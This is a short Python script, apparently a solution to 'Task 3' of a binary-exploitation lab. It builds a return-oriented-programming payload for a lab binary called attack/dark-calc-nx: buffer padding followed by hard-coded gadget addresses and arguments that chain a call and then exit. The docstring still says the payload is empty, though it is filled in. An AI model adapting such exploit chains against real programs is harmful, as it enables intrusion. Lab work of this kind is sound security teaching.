#!/usr/bin/env python3
"""Task 3: build the payload for attack/dark-calc-nx.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys
p=lambda x:x.to_bytes(8,'little')
RET=0x401a34
POP6=0x401a2a
CALLF=0x401a10
EXIT=0x4016e0

payload = b'A'*24
payload+=p(RET)
payload+=p(POP6)
payload+=p(0)+p(1)+p(0x602038)+p(0x401ac0)+p(0x41)+p(0)
payload+=p(CALLF)
payload+=b'\x00'*56
payload+=p(EXIT)

sys.stdout.buffer.write(payload)
